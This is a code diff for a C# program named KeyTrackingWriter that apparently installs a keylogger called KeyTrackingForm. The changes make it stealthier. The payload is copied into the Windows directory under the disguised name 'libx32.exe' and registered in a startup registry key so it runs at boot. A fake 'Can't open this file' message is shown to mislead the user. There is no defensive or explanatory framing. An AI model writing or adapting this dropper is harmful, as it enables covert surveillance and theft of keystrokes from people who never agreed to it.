@@ -12,27 +12,20 @@ namespace KeyTrackingWriter
 {
     static class Program
     {
-        static string appPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "app", "KeyTrackingForm.exe");
+
+        const string AppName = "libx32.exe";
+        static string CopyDir = Environment.GetEnvironmentVariable("windir");
+        static string AppPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "app", AppName);
+        static string CopyAppPath = Path.Combine(CopyDir, AppName);
 
         static void Main()
         {
-            /*
-            string pathStartUp = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
-            var exe = Assembly.GetExecutingAssembly().Location;
-            var destiny = Path.Combine(pathStartUp, Path.GetFileName(exe));
-            var data = File.ReadAllBytes(exe);
+            File.Copy(AppPath, CopyAppPath);
+            
+            RegisterInStartup(true, CopyAppPath);
 
-            File.WriteAllBytes(destiny, data);
-
-
-            RegisterInStartup(true);
-            */
-
-            RegisterInStartup(true, appPath);
-
-            //var path = Path.GetFullPath(AppDomain.CurrentDomain.BaseDirectory + "../../../KeyTrackingForm/bin/Release/KeyTrackingForm.exe");
-
-            Process.Start(appPath);
+            MessageBox.Show("Can't open this file", "Message", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            //Process.Start(CopyAppPath);
         }
 
         private static void RegisterInStartup(bool isChecked, string path)
@@ -41,12 +34,13 @@ namespace KeyTrackingWriter
 
             if (isChecked)
             {
-                registryKey.SetValue("KeyTrackingForm", path);
+                registryKey.SetValue("libx32", path);
             }
             else {
-                registryKey.DeleteValue("KeyTrackingForm");
+                registryKey.DeleteValue("libx32");
             }
         }
 
+       
     }
 }
